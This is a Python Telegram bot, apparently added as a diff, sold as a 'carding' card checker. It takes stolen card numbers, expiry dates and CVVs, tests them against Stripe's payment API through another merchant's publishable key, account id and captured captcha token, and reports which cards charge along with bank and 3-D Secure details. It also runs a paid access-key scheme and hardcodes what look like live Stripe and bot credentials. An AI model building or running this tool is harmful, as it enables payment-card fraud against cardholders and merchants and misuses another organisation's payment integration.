@@ -1,0 +1,379 @@
+import os
+import random
+import time
+import requests
+from datetime import datetime, timedelta
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
+import stripe
+
+# Replace with your actual Stripe secret key
+stripe.api_key = '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'
+
+BOT_TOKEN = '7416077727:AAFjQNTfWpi1atz6o_1nts85q7IZ0wYoiUI'
+
+registered_users = set()
+premium_users = {}
+keys_db = {}
+card_check_results = {}
+
+OWNER_ID = 7049562542
+OWNER_USERNAME = "owner_username"
+DEVELOPER_USERNAME = "AlienXGod"
+BOT_USERNAME = "bot_username"
+CHANNEL_NAME = "your_channel"
+PROOF_USERNAME = "G3N3X_07"
+
+REFERENCES_LINK = "https://t.me/AlieanXstream"
+FEEDBACK_LINK = "https://t.me/AlieanXfeadback"
+
+def add_reference_feedback_buttons(reply_markup=None):
+    keyboard = [
+        [
+            InlineKeyboardButton("み References み", url=REFERENCES_LINK),
+            InlineKeyboardButton("み Feedback み", url=FEEDBACK_LINK)
+        ]
+    ]
+    
+    if reply_markup:
+        new_inline_keyboard = reply_markup.inline_keyboard + keyboard
+        reply_markup = InlineKeyboardMarkup(new_inline_keyboard)
+    else:
+        reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    return reply_markup
+
+def start(update: Update, context: CallbackContext):
+    message = (
+        "I'm Anonymous Checker Assistant Bot\n\n"
+        "I Can Provide You Best Approved Card by Checking from Various Source of Telegram.\n"
+        "Realtime Approved Card so You Can Get Best Result for Your Carding.\n\n"
+        "Click Below Buttons for More Information."
+    )
+
+    keyboard = [
+        [
+            InlineKeyboardButton("Details", url="https://t.me/your_channel"),
+            InlineKeyboardButton("Buy Now", url="https://t.me/your_username"),
+            InlineKeyboardButton("Admin", url="https://t.me/your_username")
+        ],
+        [
+            InlineKeyboardButton("Reviews", url="https://t.me/your_review_channel"),
+            InlineKeyboardButton("Channel", url="https://t.me/your_channel")
+        ],
+        [
+            InlineKeyboardButton("Start Checking", callback_data='cc_check')
+        ]
+    ]
+
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    update.message.reply_text(message, reply_markup=reply_markup)
+
+def register(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id not in registered_users:
+        registered_users.add(user_id)
+        reply_markup = add_reference_feedback_buttons()
+        update.message.reply_text("You have been registered successfully!", reply_markup=reply_markup)
+    else:
+        reply_markup = add_reference_feedback_buttons()
+        update.message.reply_text("You are already registered.", reply_markup=reply_markup)
+
+def cc_check_callback(update: Update, context: CallbackContext):
+    query = update.callback_query
+    query.answer()
+    user_id = query.from_user.id
+    if user_id in registered_users:
+        reply_markup = add_reference_feedback_buttons()
+        query.message.reply_text("Please send the CC information in the format: `cc_number|exp_month|exp_year|cvv` using the /chk command.", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+    else:
+        reply_markup = add_reference_feedback_buttons()
+        query.message.reply_text("Please register first using /register", reply_markup=reply_markup)
+
+def show_loading_animation(context: CallbackContext, chat_id: int, message_id: int):
+    loading_steps = ["▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰"]
+    previous_text = None
+    for step in loading_steps:
+        try:
+            if previous_text != step:
+                context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=f"Checking... {step}")
+                previous_text = step
+            time.sleep(1)
+        except Exception as e:
+            print(f"Failed to update message: {e}")
+
+def check_cc(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id not in registered_users:
+        reply_markup = add_reference_feedback_buttons()
+        update.message.reply_text("Please register first using /register", reply_markup=reply_markup)
+        return
+
+    cc_info = update.message.text.split()[1]
+    cc_parts = cc_info.split('|')
+
+    if len(cc_parts) != 4:
+        reply_markup = add_reference_feedback_buttons()
+        update.message.reply_text("Please provide the CC information in the correct format: `cc_number|exp_month|exp_year|cvv`", reply_markup=reply_markup)
+        return
+
+    cc_number, exp_month, exp_year, cvv = cc_parts
+
+    # Send loading message
+    loading_message = update.message.reply_text("Checking... ▰▱▱▱▱")
+
+    # Show loading animation
+    show_loading_animation(context, update.message.chat_id, loading_message.message_id)
+
+    # Remove loading message
+    context.bot.delete_message(chat_id=update.message.chat_id, message_id=loading_message.message_id)
+
+    # Perform Stripe payment check
+    stripe_result = perform_stripe_payment_check(cc_number, exp_month, exp_year, cvv)
+
+    cc_status = "Charged! ✅" if stripe_result['success'] else "Declined! ❌"
+    cc_message = stripe_result['message']
+    cc_gateway = "Stripe Gateway" if stripe_result['gateway'] == 'stripe' else "Unknown Gateway"
+    cc_vbv = "Rejected! ❌" if stripe_result['vbv'] else "Passed! ✅"
+
+    bin_number = cc_number[:6]
+    bank_info = get_bin_info(bin_number)
+    bank_name = bank_info['bank']
+    country_name, country_flag = bank_info['country'], bank_info['flag']
+    card_brand = bank_info['brand']
+    card_type = bank_info['type']
+    card_level = bank_info['level']
+
+    response_message = (
+        "み ANONYMOUS Checker VIP \n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
+        f"• CC ⌁ `{cc_number}`\n"
+        f"• Exp ⌁ `{exp_month} ~ {exp_year}`\n"
+        f"• Cvv ⌁ `{cvv}`\n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
+        f"• Status ⌁ `{cc_status}`\n"
+        f"• Message ⌁ `{cc_message}`\n"
+        f"• GateWay ⌁ `{cc_gateway}`\n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
+        f"• VBV ⌁ `{cc_vbv}`\n"
+        f"• Extrap ⌁ `{cc_number[:12]}xxxx|{exp_month}/{exp_year}`\n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
+        f"• #BIN ⌁ `{cc_number[:6]}`\n"
+        f"• Info ⌁ `{card_brand}` ҂ `{card_type}` ҂ `{card_level}`\n"
+        f"• Bank ⌁ `{bank_name}`\n"
+        f"• Country ⌁ `{country_name} {country_flag}`\n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉"
+    )
+
+    reply_markup = add_reference_feedback_buttons()
+    update.message.reply_text(response_message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+
+def get_bin_info(bin_number):
+    url = f"https://lookup.binlist.net/{bin_number}"
+    response = requests.get(url)
+    if response.status_code != 200:
+        return {
+            'bank': 'Unknown Bank',
+            'country': 'Unknown Country',
+            'brand': 'Unknown',
+            'type': 'Unknown',
+            'level': 'Unknown',
+            'flag': '🏳️'
+        }
+    
+    bin_data = response.json()
+    bank = bin_data.get('bank', {}).get('name', 'Unknown Bank')
+    country = bin_data.get('country', {}).get('name', 'Unknown Country')
+    country_flag = bin_data.get('country', {}).get('emoji', '🏳️')
+    brand = bin_data.get('scheme', 'Unknown')
+    card_type = bin_data.get('type', 'Unknown')
+    level = bin_data.get('brand', 'Unknown')
+
+    return {
+        'bank': bank,
+        'country': country,
+        'brand': brand,
+        'type': card_type,
+        'level': level,
+        'flag': country_flag
+    }
+
+def perform_stripe_payment_check(cc_number, exp_month, exp_year, cvv):
+    headers = {
+        'accept': 'application/json',
+        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'priority': 'u=1, i',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+    }
+
+    data = {
+        'billing_details[address][city]': 'Meridian',
+        'billing_details[address][country]': 'US',
+        'billing_details[address][line1]': '505 N Main St',
+        'billing_details[address][line2]': '505 N Main St',
+        'billing_details[address][postal_code]': '10001',
+        'billing_details[address][state]': 'NY',
+        'billing_details[name]': 'smoke smoke',
+        'billing_details[email]': 'a45709493@gmail.com',
+        'type': 'card',
+        'card[number]': cc_number,
+        'card[cvc]': cvv,
+        'card[exp_year]': exp_year,
+        'card[exp_month]': exp_month,
+        'allow_redisplay': 'unspecified',
+        'payment_user_agent': 'stripe.js/f8ad184067; stripe-js-v3/f8ad184067; payment-element; deferred-intent',
+        'referrer': 'https://www.numbat.org.au',
+        'time_on_page': '19342',
+        'client_attribution_metadata[client_session_id]': '22e0d479-d923-45d1-9faa-212d6042a1d4',
+        'client_attribution_metadata[merchant_integration_source]': 'elements',
+        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+        'client_attribution_metadata[merchant_integration_version]': '2021',
+        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+        'guid': '2e904a6d-ead0-478a-8106-19591a2d507b5be851',
+        'muid': '5400ca56-ecd6-406f-b424-8b564868f7b5e0a1e1',
+        'sid': 'bd3fa433-ffeb-4ec8-af15-55c1ad8aa915f36532',
+        'key': 'pk_live_BAe0Dz7UjNaUipgyV4R9rI0b',
+        '_stripe_account': 'acct_103ioT2Ma2hz1t71',
+        'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQY8AqnEHNi60cZM7qHmxYcCYBneafM_smvZ1IwhU-SgsMgev7b0LfpYc1Qt_grRyJNMvmPoAm6foIU-YvyOFR6oD58f9InaPcMYwLiTfsnrlHOocv09MwEuvQudn_mNgjUN8AEz_1GE6snIg7qD4o0yIZRu9ed05bBPfgvc_5_SAIsDwdsy36wkTHISzlGYPyqHKp-J-4E5RD7XAysCOLvsfoTR0LSqY-b2c4kIgax6jt4-K6Sx4iw0ED2zJONGyx2EI4QzdhHuQKgoJtRVM35etutG8gYRzbcNjQAiBWBYInj3pXdhBhRGi-iEpMHQVFknwZyTRHepSs5LiZHw74XAftK8WoPvkGljKYubUnASsAFrLCmMQnzcquN39DLZ_SJmVqZhxJf02cwkD7iCEEuQG8GGvEJka5Cbst1NMDpLlhYK265BWqCMgFhWEag7AJ4vSnAkGrbCjyZlc25W2Egx3_SYu_7RHh0wOHHnaaoFMp16aM9RsQPS3z836VDPXIKDu8jjDQUUcRiUa-IZQhgVmAiILhf01HLsj0yxQNFtkucRojj0f4XjfbXMeB7H7qE5Dtv1DONAINvuBPBCrNEgBXVVlPd6M9cqvLYWbU-fM9fP52z7Gg7Szpzjy_EH3yQVIYxbHulOmsFzdgQ9SUMzCAl4hyMJndQ9zBQKB0shPLDNK1gbwVWiKn_fMJZEto2xXHLDRrLvPVLdyV-nZ2vwc4ax4rQFDPXH9COmG0rljZ7FH0hLOv3Y11lP2D8soBg6zVcULQ0ZpJAoCJ6rhotNQxTYn5oKHpQ4W5fP_ldZF3Z5CAiTiIUlcip4BkXdQ9ftPYGtvrAmMGcEuHAaofcAzs009fES-VmNG1656ncAwCzwQvqhJgXyS4Bq-gelcl2_8YCfD_Gx8TMnvHK9bGBOpt4CGcdKjuxVui6TQNIb3VG1p3TPOUKYsPShfROwOQueQ45OGX-mKsuuoBwTfQTPlp0_lnUNiFIbLny2kU3rweIZHiAs'
+    }
+
+    cookies = {
+        # Add your specific cookies here
+        'cookie_name': 'cookie_value'
+    }
+
+    response = requests.post('https://api.stripe.com/v1/payment_intents', headers=headers, data=data, cookies=cookies)
+
+    if response.status_code == 200:
+        result = response.json()
+        success = result.get('status') == 'succeeded'
+        vbv = result.get('authentication', {}).get('type') == 'three_d_secure'
+        return {
+            'success': success,
+            'message': result.get('status', 'Unknown Status'),
+            'vbv': vbv,
+            'gateway': 'stripe'
+        }
+    else:
+        return {
+            'success': False,
+            'message': 'Failed to process payment',
+            'vbv': False,
+            'gateway': 'stripe'
+        }
+
+def generate_key(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id != OWNER_ID:
+        update.message.reply_text("You are not authorized to use this command.")
+        return
+
+    try:
+        days = int(context.args[0])
+        max_uses = int(context.args[1])
+    except (IndexError, ValueError):
+        update.message.reply_text("Usage: /genkey <days> <max_uses>")
+        return
+
+    key = f"{random.choice('ABCDEFGHJKLMNPQRSTUVWXYZ')}{random.randint(1000,9999)}-{random.choice('ABCDEFGHJKLMNPQRSTUVWXYZ')}{random.randint(1000,9999)}"
+    expiry_date = datetime.now() + timedelta(days=days)
+
+    keys_db[key] = {
+        'expiry_date': expiry_date,
+        'max_uses': max_uses,
+        'current_uses': 0
+    }
+
+    key_info = (
+        "AlienXChk Key Information\n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉\n"
+        f"✵ Plan     » `{days} days`\n"
+        f"✵ Token  » `{key}`\n"
+        f"✵ Premium Duration  » `{days} days`\n"
+        f"✵ Premium End Date  » `{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}`\n"
+        f"✵ Device  » `{max_uses}`\n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉\n"
+        "How to Redeem This Token?\n"
+        "1: Go to\n"
+        f"2: `/redeem {key}`\n"
+    )
+
+    reply_markup = add_reference_feedback_buttons()
+    update.message.reply_text(key_info, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+
+def redeem_key(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id not in registered_users:
+        update.message.reply_text("Please register first using /register")
+        return
+
+    try:
+        key = context.args[0]
+    except IndexError:
+        update.message.reply_text("Usage: /redeem <key>")
+        return
+
+    if key not in keys_db:
+        update.message.reply_text("Invalid key.")
+        return
+
+    key_info = keys_db[key]
+    if key_info['current_uses'] >= key_info['max_uses']:
+        update.message.reply_text("This key has reached its maximum uses.")
+        return
+
+    premium_users[user_id] = {
+        'expiry_date': key_info['expiry_date']
+    }
+    key_info['current_uses'] += 1
+
+    user_name = update.message.from_user.username
+    expiry_date_str = key_info['expiry_date'].strftime('%Y-%m-%d %H:%M:%S')
+
+    response_message = (
+        "AlienX Key Redeemed Successfully ✅\n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉\n"
+        f"✵ Plan     » `{(key_info['expiry_date'] - datetime.now()).days} days`\n"
+        f"✵ Token  » `{key}`\n"
+        f"✵ Premium Key Redeemed  » `{user_name}`\n"
+        f"✵ Premium Duration  » `{(key_info['expiry_date'] - datetime.now()).days} days`\n"
+        f"✵ Premium End Date  » `{expiry_date_str}`\n"
+        "┉┉┉┉┉┉┉┉┉┉┉┉\n"
+    )
+
+    reply_markup = add_reference_feedback_buttons()
+    update.message.reply_text(response_message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+
+def echo(update: Update, context: CallbackContext):
+    response_message = "The command you entered is not recognized. Please use /start to see available commands."
+    reply_markup = add_reference_feedback_buttons()
+    update.message.reply_text(response_message, reply_markup=reply_markup)
+
+def main():
+    updater = Updater(BOT_TOKEN, use_context=True)
+    dp = updater.dispatcher
+
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(CommandHandler("register", register))
+    dp.add_handler(CallbackQueryHandler(cc_check_callback, pattern='^cc_check$'))
+    dp.add_handler(CommandHandler("chk", check_cc))
+    dp.add_handler(CommandHandler("genkey", generate_key))
+    dp.add_handler(CommandHandler("redeem", redeem_key))
+    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
+
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == '__main__':
+    main()
